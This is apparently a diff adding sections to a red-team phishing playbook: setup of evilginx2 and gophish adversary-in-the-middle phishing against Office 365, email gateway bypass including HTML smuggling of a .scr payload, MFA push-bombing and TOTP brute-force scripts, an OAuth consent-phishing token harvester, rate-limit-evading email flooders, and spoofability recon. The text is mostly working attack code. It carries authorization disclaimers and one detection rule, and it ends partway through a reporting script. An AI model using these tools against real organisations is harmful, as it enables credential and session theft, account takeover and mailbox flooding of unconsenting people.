@@ -892,6 +892,946 @@ blocking; consider conditional access policies requiring compliant device.
 
 ---
 
+## 16. AiTM Phishing Infrastructure — Complete Stand-up Playbook
+
+> End-to-end evilginx2 + gophish deployment on a single hardened VPS. Every step assumes lawful authorization per a signed SoW. Replace `REPLACE_WITH_YOUR_X` placeholders before use.
+
+### 16.1 VPS Provisioning and Hardening
+
+```bash
+# Provision Ubuntu 22.04+ VPS (2 vCPU / 4 GB RAM minimum)
+# SSH in as root or sudo-capable user
+
+apt update && apt upgrade -y
+apt install -y ufw fail2ban build-essential git curl wget unzip python3 python3-pip nginx sqlite3 jq
+
+# Firewall: SSH + HTTP (ACME + redirect) + HTTPS (evilginx2/gophish)
+ufw default deny incoming
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw --force enable
+
+# Disable SSH password auth
+sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+systemctl restart ssh
+
+# Enable fail2ban for SSH brute-force defense
+systemctl enable --now fail2ban
+```
+
+### 16.2 DNS Records for the Look-alike Domain
+
+```bash
+# At your authorized registrar, configure for <phish-domain>:
+#
+#   Type  Host                          Value
+#   ─────────────────────────────────────────────────────────────
+#   A     login.<phish-domain>          <vps_public_ip>
+#   A     mail.<phish-domain>           <vps_public_ip>
+#   A     <phish-domain>                <vps_public_ip>
+#   MX    <phish-domain>                10 mail.<phish-domain>
+#   TXT   <phish-domain>                "v=spf1 ip4:<vps_public_ip> -all"
+#   TXT   _dmarc.<phish-domain>         "v=DMARC1; p=none; rua=mailto:postmaster@<phish-domain>"
+#   CNAME s1._domainkey.<phish-domain>  s1.<phish-domain>.<dkim_provider>   # if using ESP
+
+# Verify propagation
+dig +short login.<phish-domain>
+dig +short MX <phish-domain>
+dig +short TXT <phish-domain>
+dig +short TXT _dmarc.<phish-domain>
+```
+
+### 16.3 evilginx2 Build and Operational Launch
+
+```bash
+# Install Go 1.21+
+wget -q https://go.dev/dl/go1.21.13.linux-arm64.tar.gz
+sudo tar -C /usr/local -xzf go1.21.13.linux-arm64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
+
+# Build evilginx2
+git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx2-src
+cd /opt/evilginx2-src && make
+
+# Stage directories
+sudo mkdir -p /opt/evilginx2/{phishlets,data,logs}
+sudo cp ./bin/evilginx /opt/evilginx2/
+sudo cp -r phishlets/* /opt/evilginx2/phishlets/
+
+# Launch evilginx2 as a systemd service (recommended over interactive)
+sudo tee /etc/systemd/system/evilginx2.service > /dev/null <<'EOF'
+[Unit]
+Description=evilginx2 AiTM reverse proxy
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/opt/evilginx2
+ExecStart=/opt/evilginx2/evilginx -p /opt/evilginx2/phishlets
+Restart=on-failure
+RestartSec=5
+StandardOutput=append:/opt/evilginx2/logs/evilginx2.log
+StandardError=append:/opt/evilginx2/logs/evilginx2.err.log
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable --now evilginx2
+sudo systemctl status evilginx2 --no-pager
+```
+
+### 16.4 evilginx2 First-Run Configuration via CLI
+
+```bash
+# Connect to evilginx2 CLI (use REST API or netcat to its control port if needed;
+# for the lab, simply run interactively and then enable as service after config)
+
+sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d <<'EOF'
+config domain <phish-domain>
+config ip <vps_public_ip>
+phishlets hostname office365 login.<phish-domain>
+phishlets enable office365
+lures create office365
+lures get-url 0
+EOF
+
+# Save the printed lure URL — gophish will redirect victims to this
+```
+
+### 16.5 gophish Build, Config, Launch
+
+```bash
+cd /opt
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-arm64.zip
+unzip gophish-v0.12.1-linux-arm64.zip -d /opt/gophish
+chmod +x /opt/gophish/gophish
+
+# Lock admin UI to localhost (edit config.json before first launch)
+sudo sed -i 's/"listen_url": "0.0.0.0:3333"/"listen_url": "127.0.0.1:3333"/' /opt/gophish/config.json
+
+# Launch gophish as systemd service
+sudo tee /etc/systemd/system/gophish.service > /dev/null <<'EOF'
+[Unit]
+Description=gophish campaign platform
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/opt/gophish
+ExecStart=/opt/gophish/gophish
+Restart=on-failure
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable --now gophish
+
+# Tunnel admin UI to your workstation (do NOT expose publicly)
+# From your workstation:
+ssh -L 3333:127.0.0.1:3333 user@<vps_public_ip>
+# Then open https://localhost:3333/ in your browser
+# Capture the initial admin password from `journalctl -u gophish`
+# CHANGE it immediately, then generate an API key in Account Settings
+```
+
+### 16.6 nginx Reverse Proxy (TLS termination + beacon routing)
+
+```nginx
+# /etc/nginx/sites-available/<phish-domain>
+server {
+    listen 443 ssl http2;
+    server_name login.<phish-domain>;
+
+    ssl_certificate     /etc/letsencrypt/live/<phish-domain>/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/<phish-domain>/privkey.pem;
+
+    # evilginx2 listens on 127.0.0.1:8443 (set via `config port 8443` in evilginx CLI)
+    location / {
+        proxy_pass https://127.0.0.1:8443;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    # Beacon server runs on 127.0.0.1:5000 (Flask)
+    location /beacon/ {
+        proxy_pass http://127.0.0.1:5000;
+    }
+}
+
+server {
+    listen 80;
+    server_name login.<phish-domain> <phish-domain>;
+    return 301 https://$host$request_uri;
+}
+```
+
+```bash
+# Obtain Let's Encrypt cert (if evilginx2 not handling ACME itself)
+sudo certbot certonly --nginx -d login.<phish-domain> -d <phish-domain>
+sudo ln -s /etc/nginx/sites-available/<phish-domain> /etc/nginx/sites-enabled/
+sudo nginx -t && sudo systemctl reload nginx
+```
+
+### 16.7 Operational Verification Checklist
+
+```bash
+# All of these must pass before the campaign launches
+
+# 1. DNS resolves correctly
+test "$(dig +short login.<phish-domain> | head -1)" = "<vps_public_ip>" && echo OK || echo FAIL
+
+# 2. TLS cert valid
+echo | openssl s_client -connect login.<phish-domain>:443 -servername login.<phish-domain> 2>/dev/null \
+  | openssl x509 -noout -subject -dates
+
+# 3. evilginx2 responding (expect a redirect)
+curl -sI https://login.<phish-domain>/<lure_id> | head -3
+
+# 4. gophish admin UI reachable via SSH tunnel
+curl -ksI https://127.0.0.1:3333/ | head -1   # 200 OK after tunnel established
+
+# 5. Beacon server responding
+curl -s https://login.<phish-domain>/beacon/open?id=test | file -  # PNG image
+```
+
+---
+
+## 17. Gateway Bypass Techniques — Unified Playbook
+
+> Consolidated techniques for bypassing Proofpoint, Mimecast, Cisco ESA, and Microsoft Defender for Office. Each technique is rated for effectiveness and detection risk.
+
+### 17.1 URL Defense / Safe Links Rewriting Evasion
+
+```bash
+# Test which of your look-alike domains escape rewriting
+# (Some configs exclude internal or trusted-domain senders)
+
+LOOKALIKES="micros0ft-login.com m1crosoft-login.com microsoft-security.net msft-secure-login.com"
+
+for d in $LOOKALIKES; do
+  # Send probe mail with a tracking link to a probe mailbox you control
+  swaks --to probe@<target.com> \
+    --from "test@$d" \
+    --server mail.<target.com> \
+    --header "Subject: probe for $d" \
+    --header "Content-Type: text/html" \
+    --body "<a href='https://$d/test'>click</a>"
+
+  echo "Probe sent from $d — inspect received mail for URL rewriting"
+done
+
+# On the probe mailbox side, inspect each received mail:
+#   grep -oE 'https?://[^"<> ]+' /var/mail/probe | sort -u
+# If URL is original → domain escaped rewriting
+# If URL contains urldefense.proofpoint.com or safelinks.protection.outlook.com → rewritten
+```
+
+```python
+#!/usr/bin/env python3
+# classify_rewrite.py — parse a mailbox and classify URLs as rewritten vs original
+import re, sys, mailbox
+
+REWRITER_PATTERNS = [
+    r'urldefense\.proofpoint\.com',           # Proofpoint URL Defense
+    r'safelinks\.protection\.outlook\.com',   # Microsoft Defender Safe Links
+    r'protect\.mimecast\.com',                # Mimecast URL expansion
+    r'casetest\.email\.cisco\.com',           # Cisco ESA URL rewrite
+]
+
+def classify(url):
+    for pat in REWRITER_PATTERNS:
+        if re.search(pat, url, re.I):
+            return ('rewritten', pat)
+    return ('original', None)
+
+for msg in mailbox.mbox(sys.argv[1]):
+    body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
+    for url in set(re.findall(r'https?://[^\s"<>]+', body)):
+        status, matcher = classify(url)
+        print(f'{status:10s} {url}')
+```
+
+### 17.2 Attachment Sandbox Evasion — Encrypted-Zip Pattern
+
+```bash
+# Build an encrypted-zip with a benign payload for sandbox-bypass testing
+# (Real engagements use this to deliver a stager; lab uses a benign calc-equivalent)
+
+# 1. Build a benign test binary (C source)
+cat > /tmp/benign.c <<'EOF'
+#include <stdio.h>
+int main() {
+    printf("lab benign payload executed\n");
+    return 0;
+}
+EOF
+gcc /tmp/benign.c -o /tmp/benign_payload
+
+# 2. Encrypt in a zip (password sent via separate channel)
+PASSWORD='REPLACE_WITH_YOUR_ZIP_PASSWORD'
+zip -e -P "$PASSWORD" /tmp/document.zip /tmp/benign_payload
+
+# 3. Send via swaks (mimics what gophish would send)
+swaks --to probe@<target.com> \
+  --from "DocShare <noreply@<phish-domain>>" \
+  --server mail.<target.com> \
+  --header "Subject: Q2 document for review" \
+  --header "Content-Type: multipart/mixed; boundary=\"BOUND\"" \
+  --body "$(cat <<BODY
+--BOUND
+Content-Type: text/plain
+
+Hi, please review the attached document. Password sent separately via Signal.
+
+--BOUND
+Content-Type: application/zip
+Content-Disposition: attachment; filename="document.zip"
+Content-Transfer-Encoding: base64
+
+$(base64 -w0 /tmp/document.zip)
+
+--BOUND--
+BODY
+)"
+```
+
+### 17.3 HTML Smuggling (Attachment Sandbox Bypass)
+
+```html
+<!-- smuggle.html — gateway sees only HTML/JS; binary reconstructed client-side -->
+<!DOCTYPE html>
+<html>
+<head><title>Confidential Document</title></head>
+<body>
+<h3>Loading document...</h3>
+<script>
+// Placeholder base64 — in real engagements this is a stager payload
+// NEVER hard-code real payload bytes; pull from C2 at click time for OPSEC
+const PAYLOAD_B64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAAaaaaaaaaaaaaaaaaaaa==";
+
+function downloadBlob() {
+  const bin = atob(PAYLOAD_B64);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  const blob = new Blob([bytes], {type: 'application/octet-stream'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'document.pdf.scr';   // .scr to defeat extension-based filtering
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+window.setTimeout(downloadBlob, 1500);  // delay defeats some sandbox VM checks
+</script>
+</body>
+</html>
+```
+
+### 17.4 Sender Reputation Bypass via ESP Relay
+
+```bash
+# Use a legitimate ESP (Mailgun, SendGrid, Amazon SES) for delivery
+# — they have warmed-up IPs and pre-established reputation
+
+# Mailgun example (REPLACE_WITH_YOUR_ESP_KEY stored in env, never in code)
+curl -s --user "api:$MAILGUN_API_KEY" \
+  "https://api.mailgun.net/v3/<phish-domain>/messages" \
+  -F from="DocShare <noreply@<phish-domain>>" \
+  -F to="probe@<target.com>" \
+  -F subject="Document Review" \
+  -F html="<html><body>Click <a href='https://login.<phish-domain>/lure/0'>here</a></body></html>" \
+  -F o:tracking=false \
+  -F o:tag='redteam-campaign'
+
+# Note: ESPs log all sends and cooperate with law enforcement; use only with
+# explicit authorization and within the test window
+```
+
+### 17.5 Gateway Bypass Decision Matrix
+
+| Gateway Feature | Bypass Technique | Effectiveness | Detection Risk |
+|-----------------|------------------|---------------|----------------|
+| URL rewriting (Proofpoint URL Defense) | Delayed DNS rotation / fast-flux | Medium | High (CT logs catch new certs) |
+| URL rewriting (Defender Safe Links) | Look-alike domain in allowed TLD | Low | Low |
+| Attachment sandbox (Safe Attachments) | Encrypted-zip | High | Low |
+| Attachment sandbox (Cisco ESA) | HTML smuggling, .iso/.img | High | Low |
+| Sender reputation (all) | ESP relay (Mailgun/SendGrid) | High | Medium |
+| DMARC enforcement (`p=reject`) | Look-alike domain (no real-brand spoof) | High | Low |
+| DKIM signature required | Self-sign look-alike domain | High | Low |
+| Conditional Access (require compliant device) | None — out-of-band attack pivot | N/A | N/A |
+
+---
+
+## 18. MFA Fatigue and BFA (Brute-Force MFA) Payloads
+
+> MFA fatigue (also known as "push bombing") floods a victim with MFA prompts until they approve one out of annoyance. Authorization required — this is a real attack vector used by LAPSUS$ and others, and unauthorized use is a crime.
+
+### 18.1 Push Bombing — Reconnaissance
+
+```bash
+# Identify which users in scope use push MFA (vs TOTP, SMS, FIDO2)
+# In Microsoft Graph (requires AuditLog.Read.All permission)
+Connect-MgGraph -Scopes "UserAuthenticationMethod.Read.All,AuditLog.Read.All"
+
+# List users with push MFA enabled
+Get-MgUser -All | ForEach-Object {
+  $upn = $_.UserPrincipalName
+  $methods = Get-MgUserAuthenticationMethod -UserId $upn
+  $methods | Where-Object { $_.AdditionalProperties.'@odata.type' -match 'microsoftAuthenticator' } |
+    ForEach-Object { Write-Host "$upn → push (Microsoft Authenticator)" }
+}
+```
+
+### 18.2 Push Bombing — Triggering Repeated Prompts
+
+```bash
+# Repeatedly trigger MFA by submitting the victim's credential to the real
+# login endpoint. Each successful credential submit triggers a fresh push.
+#
+# This requires already-having the victim's password (e.g., from breach data,
+# OSINT, or a prior AiTM credential capture without session).
+
+# Pseudocode — adapt to your target IdP
+python3 <<'EOF'
+import requests, time
+
+IDP_LOGIN = 'https://login.microsoftonline.com/common/GetCredentialType'
+VICTIM_UPN = 'user_push@<target>.onmicrosoft.com'
+VICTIM_PW  = 'REPLACE_WITH_YOUR_CAPTURED_PASSWORD'
+INTERVAL   = 30   # seconds between prompts; too fast trips rate-limit
+DURATION   = 600  # 10 minutes of push bombing
+
+start = time.time()
+count = 0
+while time.time() - start < DURATION:
+    # Trigger MFA by initiating a real sign-in
+    r = requests.post(IDP_LOGIN, json={'username': VICTIM_UPN, 'isOtherIdpSupported': True})
+    count += 1
+    print(f"[{count}] prompt triggered, HTTP {r.status_code}")
+    time.sleep(INTERVAL)
+EOF
+
+# Note: Modern Azure AD throttles after 3-5 rapid prompts per minute.
+# Realistic attackers space prompts 30-60s apart and target off-hours
+# (late night local time) when the victim is sleepy / less vigilant.
+```
+
+### 18.3 BFA (Brute-Force Authentication Code) for TOTP
+
+```python
+#!/usr/bin/env python3
+# bfa_totp.py — brute-force a 6-digit TOTP code within its 30-second window
+# Rate limits make this largely impractical against modern IdPs; documented
+# for completeness. Most IdPs lock after 5-10 failed attempts per window.
+import time, requests, itertools, concurrent.futures
+
+TARGET_URL = 'https://login.<target>.com/mfa/verify'
+VICTIM_SESSION = 'REPLACE_WITH_YOUR_SESSION_COOKIE'
+
+def attempt(code):
+    r = requests.post(TARGET_URL,
+                      cookies={'session': VICTIM_SESSION},
+                      data={'code': code})
+    return code, r.status_code == 200
+
+# Try all 1M codes — but most IdPs will lock out after ~10 attempts
+codes = [f'{i:06d}' for i in range(1000000)]
+window_start = time.time()
+window_end   = window_start + 30  # TOTP window
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:  # serial to avoid rate-limit
+    for code in codes:
+        if time.time() > window_end:
+            print('window expired')
+            break
+        c, success = attempt(code)
+        if success:
+            print(f'CODE FOUND: {c}')
+            break
+        time.sleep(0.5)  # respect rate-limit
+```
+
+### 18.4 AiTM OAuth Token Theft (Alternative to Push Bombing)
+
+```python
+#!/usr/bin/env python3
+# oauth_consent_phish.py — register a malicious Azure AD app and phish consent
+# Effective even against FIDO2-protected users (consent doesn't trigger MFA)
+# REQUIRES: an Azure AD tenant you control to register the malicious app
+
+# 1. Register an Azure AD app with these scopes ( Graph API ):
+#    - Mail.Read
+#    - User.Read.All
+#    - Files.Read.All
+#    - offline_access   (← enables refresh tokens; long-lived access)
+
+# 2. Build the consent URL
+APP_ID = 'REPLACE_WITH_YOUR_APP_CLIENT_ID'
+REDIRECT = 'https://login.<phish-domain>/oauth/callback'
+SCOPES = 'Mail.Read User.Read.All Files.Read.All offline_access'
+
+CONSENT_URL = (
+    f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
+    f'?client_id={APP_ID}'
+    f'&response_type=code'
+    f'&redirect_uri={REDIRECT}'
+    f'&scope={SCOPES}'
+    f'&prompt=consent'
+)
+print('Send victim to:', CONSENT_URL)
+
+# 3. Victim consents → Azure AD redirects to your callback with ?code=...
+# 4. Exchange code for access + refresh tokens:
+from flask import Flask, request
+import requests as rq
+
+app = Flask(__name__)
+
+@app.route('/oauth/callback')
+def callback():
+    code = request.args.get('code')
+    if not code:
+        return 'missing code', 400
+
+    # Exchange code for tokens (server-side, victim never sees the token)
+    token_resp = rq.post(
+        'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+        data={
+            'client_id': APP_ID,
+            'client_secret': 'REPLACE_WITH_YOUR_APP_SECRET',
+            'code': code,
+            'redirect_uri': REDIRECT,
+            'grant_type': 'authorization_code',
+            'scope': SCOPES,
+        }
+    )
+    tokens = token_resp.json()
+    # Store access_token and refresh_token securely per SoW
+    log_consent_capture(tokens.get('expires_in'), tokens.get('scope'))
+    return 'Thank you. You may close this window.'
+
+def log_consent_capture(expires_in, scope):
+    # Log without storing the actual token in plaintext logs
+    print(f'[capture] expires_in={expires_in} scope={scope}')
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+```
+
+---
+
+## 19. Email Bombing — Rate-Limit Evasion and Variants
+
+> Already covered in Section 11 (basic BombErAtom + custom Python). This section extends with rate-limit evasion, multi-provider rotation, and defense-side detection rules.
+
+### 19.1 Multi-Provider Rotation Flooder
+
+```python
+#!/usr/bin/env python3
+# rotate_flood.py — distribute flood across multiple ESPs to evade per-sender rate limits
+# Each provider has its own per-sender-per-hour limit; rotating bypasses single-provider caps
+import smtplib, threading, time, itertools
+from email.mime.text import MIMEText
+
+TARGET = 'victim@<target.com>'
+COUNT_PER_PROVIDER = 50
+THREADS = 4
+
+# Each tuple: (smtp_host, port, username, password, from_addr)
+# Populate from your authorized ESP accounts — NEVER hard-code real creds in source
+PROVIDERS = [
+    ('smtp.mailgun.org',   587, 'mg-user',     'REPLACE_WITH_YOUR_MAILGUN_PW',    'mg@<phish-domain>'),
+    ('smtp.sendgrid.net',  587, 'apikey',      'REPLACE_WITH_YOUR_SENDGRID_KEY',  'sg@<phish-domain>'),
+    ('email-smtp.us-east-1.amazonaws.com', 587, 'ses-user', 'REPLACE_WITH_YOUR_SES_PW', 'ses@<phish-domain>'),
+]
+
+def flood_one_provider(provider, count, stop):
+    host, port, user, pw, sender = provider
+    sent = 0
+    while not stop.is_set() and sent < count:
+        try:
+            msg = MIMEText(f"notification {time.time()}")
+            msg['Subject'] = 'reminder'
+            msg['From'] = sender
+            msg['To'] = TARGET
+            with smtplib.SMTP(host, port, timeout=10) as s:
+                s.starttls()
+                s.login(user, pw)
+                s.sendmail(sender, [TARGET], msg.as_string())
+            sent += 1
+            time.sleep(2)  # be gentle — the goal is volume across providers, not per-provider speed
+        except Exception as e:
+            print(f'error from {host}: {e}')
+            time.sleep(10)
+    print(f'{host}: sent {sent}/{count}')
+
+if __name__ == '__main__':
+    stop = threading.Event()
+    threads = []
+    for provider in PROVIDERS:
+        for _ in range(THREADS):
+            t = threading.Thread(target=flood_one_provider, args=(provider, COUNT_PER_PROVIDER, stop))
+            t.start()
+            threads.append(t)
+    for t in threads: t.join()
+```
+
+### 19.2 Slow-Drip Flooder (Evades Per-Minute Rate Alerts)
+
+```python
+#!/usr/bin/env python3
+# slow_drip.py — sends 1 msg/min/sender over 24h to fly under per-minute alert thresholds
+# Total volume over time equals a flood, but no single minute triggers rate alerts
+import smtplib, time
+from email.mime.text import MIMEText
+
+TARGET = 'victim@<target.com>'
+HOURS = 24
+PER_HOUR = 60   # 1/min — under most gateway rate alerts
+
+# Cycle through sender identities (each looks like a different legitimate sender)
+SENDERS = [
+    'noreply@<phish-domain>',
+    'admin@<phish-domain>',
+    'support@<phish-domain>',
+    'alerts@<phish-domain>',
+    'billing@<phish-domain>',
+]
+
+def drip():
+    start = time.time()
+    end = start + HOURS * 3600
+    count = 0
+    while time.time() < end:
+        sender = SENDERS[count % len(SENDERS)]
+        msg = MIMEText(f'message {count}')
+        msg['Subject'] = f'notice {count}'
+        msg['From'] = sender
+        msg['To'] = TARGET
+        try:
+            with smtplib.SMTP('mail.<phish-domain>', 587, timeout=10) as s:
+                s.starttls()
+                s.login(sender, 'REPLACE_WITH_YOUR_SMTP_PW')
+                s.sendmail(sender, [TARGET], msg.as_string())
+            count += 1
+        except Exception as e:
+            print(f'error: {e}')
+        time.sleep(3600 / PER_HOUR)
+
+if __name__ == '__main__':
+    drip()
+```
+
+### 19.3 Defense-Side Detection Rule (per-recipient flood)
+
+```bash
+# Aggregate inbound to single mailbox per minute from diverse senders
+# Postfix log example:
+awk '/to=<victim@<target>\.com>/ && /status=sent/ {
+        ts = substr($1,1,15)":"substr($2,1,5)
+        from = ""
+        for (i=1; i<=NF; i++) if ($i ~ /^from=/) from = $i
+        key = ts"|"from
+        count[key]++
+     }
+     END {
+        for (k in count) print count[k], k
+     }' /var/log/mail.log | sort -rn | head -20
+
+# Alert rule: if > 50 unique senders delivering to a single recipient in 5 min, trigger flood alert
+# PagerDuty / Slack hook config omitted — adapt to your IR workflow
+
+# Microsoft 365 equivalent (Exchange Online PowerShell):
+# Get-MessageTrace -RecipientAddress victim@target.com -StartDate (Get-Date).AddHours(-1) -EndDate (Get-Date) |
+#   Group-Object SenderAddress |
+#   Where-Object { $_.Count -gt 50 } |
+#   Format-Table Count, Name
+```
+
+---
+
+## 20. DMARC / SPF / DKIM Reconnaissance and Abuse
+
+> Protocol-level fundamentals covered in `skills/email-protocol-attack/`. This section covers the *campaign-operations* angle: how attackers enumerate a target's mail-auth posture to identify spoofable identities and weak alignment.
+
+### 20.1 Automated Posture Recon (Multiple Domains)
+
+```bash
+#!/usr/bin/env bash
+# dmarc_recon.sh — enumerate mail-auth posture for a list of domains
+# Output: per-domain row indicating DMARC policy, SPF record, DKIM selectors, MX hosts
+
+DOMAINS_FILE="${1:-domains.txt}"
+
+while read -r d; do
+  [ -z "$d" ] && continue
+
+  printf '%-30s ' "$d"
+
+  # DMARC policy
+  dmarc=$(dig +short TXT _dmarc.$d | tr -d '"' | head -1)
+  policy=$(echo "$dmarc" | grep -oE 'p=[a-z]+' | cut -d= -f2)
+  printf 'DMARC=%-10s ' "${policy:-none}"
+
+  # SPF
+  spf=$(dig +short TXT $d | tr -d '"' | grep -o 'v=spf1[^"]*')
+  if [ -n "$spf" ]; then
+    if echo "$spf" | grep -q '\-all'; then spfpolicy='hardfail'
+    elif echo "$spf" | grep -q '\~all'; then spfpolicy='softfail'
+    elif echo "$spf" | grep -q '\?all'; then spfpolicy='neutral'
+    elif echo "$spf" | grep -q 'all'; then spfpolicy='passall'
+    else spfpolicy='unknown'
+    fi
+  else
+    spfpolicy='missing'
+  fi
+  printf 'SPF=%-10s ' "$spfpolicy"
+
+  # MX
+  mx=$(dig +short MX $d | head -1 | awk '{print $2}')
+  printf 'MX=%-30s\n' "${mx:-none}"
+
+done < "$DOMAINS_FILE"
+
+# Sample output:
+#   target.com       DMARC=reject    SPF=hardfail    MX=target-com.mail.protection.outlook.com.
+#   sub1.target.com  DMARC=none      SPF=missing     MX=none                            ← orphaned subdomain, spoofable!
+```
+
+### 20.2 DKIM Selector Enumeration
+
+```bash
+#!/usr/bin/env bash
+# dkim_enum.sh — try common DKIM selectors for a domain
+DOMAIN="$1"
+SELECTORS="default google s1 s2 selector1 selector2 mail galaxy microsoft office365 k1"
+
+for s in $SELECTORS; do
+  result=$(dig +short TXT "$s._domainkey.$DOMAIN")
+  if [ -n "$result" ]; then
+    echo "FOUND: $s._domainkey.$DOMAIN → $(echo $result | head -c 80)..."
+  fi
+done
+
+# Common O365 selector: selector1._domainkey.<tenant>.onmicrosoft.com
+# Common Google Workspace: google._domainkey.<domain>
+# Common Mailgun: mta._domainkey.<domain>
+```
+
+### 20.3 Spoofable-Identity Identification
+
+```python
+#!/usr/bin/env python3
+# identify_spoofable.py — combine DMARC + SPF + subdomain enumeration to find spoofable identities
+# A domain is "spoofable" if DMARC is p=none or missing AND no SPF enforcement
+import dns.resolver, subprocess
+
+def lookup_txt(name):
+    try:
+        answers = dns.resolver.resolve(name, 'TXT')
+        return [r.to_text().strip('"') for r in answers]
+    except Exception:
+        return []
+
+def assess_domain(d):
+    dmarc = lookup_txt(f'_dmarc.{d}')
+    spf = [t for t in lookup_txt(d) if 'v=spf1' in t]
+
+    dmarc_policy = 'none'
+    for t in dmarc:
+        if 'p=reject' in t: dmarc_policy = 'reject'
+        elif 'p=quarantine' in t: dmarc_policy = 'quarantine'
+        elif 'p=none' in t: dmarc_policy = 'none'
+
+    spf_enforced = any('-all' in t for t in spf)
+
+    if dmarc_policy == 'reject':
+        return ('safe', 'DMARC reject')
+    if dmarc_policy == 'quarantine':
+        return ('mostly safe', 'DMARC quarantine')
+    if spf_enforced and dmarc_policy == 'none':
+        return ('partial', 'SPF enforced but DMARC none — spoof with aligned header')
+    return ('spoofable', f'DMARC={dmarc_policy}, SPF_enforced={spf_enforced}')
+
+# Enumerate subdomains via crt.sh (certificate transparency)
+def get_subdomains(d):
+    import requests
+    r = requests.get(f'https://crt.sh/?q=%.{d}&output=json', timeout=30)
+    if r.status_code != 200:
+        return []
+    subs = set()
+    for entry in r.json():
+        for name in entry.get('name_value', '').split('\n'):
+            name = name.strip().lstrip('*.')
+            if name.endswith(d):
+                subs.add(name)
+    return sorted(subs)
+
+if __name__ == '__main__':
+    import sys
+    domain = sys.argv[1]
+    print(f'Assessing {domain} and subdomains...')
+    for sub in [domain] + get_subdomains(domain):
+        verdict, reason = assess_domain(sub)
+        flag = '⚠️ ' if verdict == 'spoofable' else '   '
+        print(f'{flag}{verdict:15s} {sub:40s} ({reason})')
+```
+
+### 20.4 ARC (Authenticated Received Chain) Inspection
+
+```bash
+# ARC preserves auth results across forwarders; inspecting it reveals
+# whether forwarded mail passed auth at the original sender
+
+# Sample ARC headers on a received mail:
+#   ARC-Authentication-Results: i=1; mx.google.com;
+#       dkim=pass header.i=@sender-domain.com header.s=selector1;
+#       spf=pass (google.com: domain of sender@sender-domain.com designates X as permitted sender)
+#       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=sender-domain.com
+#   ARC-Seal: i=1; a=rsa-sha256; t=...; cv=none;
+#       b=...
+#   ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+#       d=google.com; ...
+
+# Extract and display ARC chain from a saved mail:
+python3 <<'EOF'
+import email, sys
+msg = email.message_from_file(open(sys.argv[1]))
+arc_headers = [(k, v) for k, v in msg.items() if k.lower().startswith('arc-')]
+for k, v in arc_headers:
+    print(f'{k}: {v[:120]}')
+EOF
+```
+
+---
+
+## 21. Campaign Telemetry Aggregation and Funnel Reporting
+
+> End-to-end script that pulls gophish + evilginx2 + beacon events and produces a unified funnel report.
+
+### 21.1 Telemetry Schema (Unified)
+
+```sql
+-- /opt/beacon/campaign.db
+CREATE TABLE IF NOT EXISTS victims (
+    victim_id TEXT PRIMARY KEY,
+    email TEXT,
+    first_name TEXT,
+    last_name TEXT,
+    sent_at REAL,
+    delivered_at REAL
+);
+
+CREATE TABLE IF NOT EXISTS events (
+    id INTEGER PRIMARY KEY,
+    ts REAL,
+    victim_id TEXT,
+    event TEXT,          -- sent|delivered|open|click|cred_submit|mfa_complete|session_captured|fido2_blocked|replay_attempt|replay_blocked
+    meta TEXT,           -- JSON blob for additional context
+    FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
+);
+
+CREATE INDEX IF NOT EXISTS idx_events_victim ON events(victim_id);
+CREATE INDEX IF NOT EXISTS idx_events_event ON events(event);
+```
+
+### 21.2 Unified Funnel Report Generator
+
+```python
+#!/usr/bin/env python3
+# funnel_report.py — produce campaign funnel from unified telemetry
+import sqlite3, json, os, sys
+from collections import defaultdict
+
+DB = '/opt/beacon/campaign.db'
+
+def generate_funnel():
+    conn = sqlite3.connect(DB)
+    victims = {row[0]: row for row in conn.execute('select * from victims')}
+
+    # Build per-victim event timeline
+    by_victim = defaultdict(set)
+    for victim_id, event in conn.execute('select victim_id, event from events'):
+        by_victim[victim_id].add(event)
+
+    funnel = {
+        'sent':              sum(1 for v in by_victim if 'sent' in by_victim[v]),
+        'delivered':         sum(1 for v in by_victim if 'delivered' in by_victim[v]),
+        'opened':            sum(1 for v in by_victim if 'open' in by_victim[v]),
+        'clicked':           sum(1 for v in by_victim if 'click' in by_victim[v]),
+        'cred_submitted':    sum(1 for v in by_victim if 'cred_submit' in by_victim[v]),
+        'mfa_completed':     sum(1 for v in by_victim if 'mfa_complete' in by_victim[v]),
+        'session_captured':  sum(1 for v in by_victim if 'session_captured' in by_victim[v]),
+        'fido2_blocked':     sum(1 for v in by_victim if 'fido2_blocked' in by_victim[v]),
+        'replay_attempted':  sum(1 for v in by_victim if 'replay_attempt' in by_victim[v]),
+        'replay_blocked':    sum(1 for v in by_victim if 'replay_blocked' in by_victim[v]),
+    }
+    return funnel
+
+def render_console(funnel):
+    print('Stage               Count')
+    print('─' * 30)
+    for stage, count in funnel.items():
+        print(f'{stage:20s} {count:5d}')
+
+def render_markdown(funnel, output_path):
+    with open(output_path, 'w') as f:
+        f.write('# Campaign Funnel Report\n\n')
